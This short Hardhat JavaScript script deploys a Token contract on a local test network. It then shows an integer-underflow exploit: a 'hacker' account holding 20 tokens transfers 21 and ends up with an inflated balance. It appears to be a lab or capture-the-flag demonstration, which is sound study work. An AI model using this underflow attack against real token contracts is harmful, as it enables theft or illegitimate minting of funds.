const hre = require("hardhat");

async function main() {
  const Contract = await hre.ethers.getContractFactory("Token");
  const contract = await Contract.deploy(100);
  await contract.deployed();

  const [ownerDeployer, hacker, random] = await hre.ethers.getSigners();

  await contract.connect(ownerDeployer).transfer(hacker.address, 20);
  await contract.connect(hacker).transfer(random.address, 21)

  console.log(await contract.balanceOf(hacker.address) > 20);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
